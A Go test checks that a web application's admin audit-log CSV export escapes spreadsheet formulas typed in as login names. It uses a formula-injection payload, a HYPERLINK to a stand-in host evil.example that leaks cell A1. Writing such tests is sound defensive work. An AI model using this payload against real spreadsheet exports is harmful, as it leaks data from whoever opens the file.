package web

import (
	"encoding/csv"
	"net/url"
	"strings"
	"testing"
)

// A failed login records the identifier typed by anyone as the actor: in
// the CSV export it must not come out as a live spreadsheet formula.
func TestAuditExportNeutralizesFormulas(t *testing.T) {
	ts, _, admin, _ := adminClient(t)
	payload := `=HYPERLINK("http://evil.example/?"&A1,"x")`
	c := newClient(t)
	csrf := identify(t, c, ts.URL, payload, "")
	resp, err := c.PostForm(ts.URL+"/login/password", url.Values{"_csrf": {csrf}, "password": {"wrong"}})
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()

	resp, err = admin.Get(ts.URL + "/admin/audit/export.csv")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	records, err := csv.NewReader(resp.Body).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, rec := range records {
		for _, cell := range rec {
			if strings.HasPrefix(cell, "=") || strings.HasPrefix(cell, "+") || strings.HasPrefix(cell, "@") {
				t.Errorf("formula-like cell exported as is: %q", cell)
			}
			if cell == "'"+strings.ToLower(payload) || cell == "'"+payload {
				found = true
			}
		}
	}
	if !found {
		t.Errorf("the failed login should be exported, escaped; got %v", records)
	}
}
